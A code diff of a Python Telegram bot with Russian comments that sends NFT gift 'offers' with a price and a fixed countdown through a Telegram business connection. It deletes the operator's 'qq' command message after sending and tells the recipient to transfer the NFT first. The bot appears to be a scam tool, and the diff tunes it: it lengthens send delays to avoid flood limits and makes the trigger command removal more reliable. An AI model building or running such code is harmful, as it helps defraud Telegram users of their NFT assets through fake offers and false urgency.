@@ -98,8 +98,9 @@ def build_offer_text(gift_name, gift_num, amount, currency_symbol, lang):
     loc = LOCALES.get(lang, LOCALES["ru"])
     slug = gift_name.replace(" ", "")
     
+    # Исправленная HTML-разметка без дублирования тегов
     base = (
-        f'🎁 <b>{loc["success_title"]} <a href="https://t.me/nft/{slug}-{gift_num}"><b>{gift_name} #{gift_num}</b></a></b>\n\n'
+        f'🎁 <b>{loc["success_title"]} <a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n'
         f'Пользователь {loc["offer_text"]} <b>{amount} {currency_symbol}</b> за данный предмет.\n\n'
         f'⏱ <i>{loc["timer"]} 5 ч. 59 мин.</i>\n'
         f'🔒 <i>{loc["lock"]}</i>'
@@ -257,12 +258,13 @@ async def decline_offer(cb: CallbackQuery):
 async def noop_handler(cb: CallbackQuery):
     await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)
 
-# Фоновый воркер с рандомной задержкой
+# Фоновый воркер с безопасной задержкой от флуда
 async def sender_worker():
     while True:
         task = await message_queue.get()
         try:
-            await asyncio.sleep(random.uniform(0.4, 1.2))
+            # Безопасная пауза 1.5 - 2.5 сек
+            await asyncio.sleep(random.uniform(1.5, 2.5))
 
             text = build_offer_text(
                 task["gift_name"], 
@@ -280,7 +282,7 @@ async def sender_worker():
             )
 
             # 1. Отправляем оффер
-            await bot.send_message(
+            sent_msg = await bot.send_message(
                 chat_id=task["chat_id"],
                 text=text,
                 parse_mode=ParseMode.HTML,
@@ -291,7 +293,8 @@ async def sender_worker():
             )
 
             # 2. Удаляем команду qq
-            if task["bcid"]:
+            if task["bcid"] and sent_msg:
+                await asyncio.sleep(0.3)
                 await bot.delete_business_messages(
                     business_connection_id=task["bcid"],
                     message_ids=[task["cmd_message_id"]]
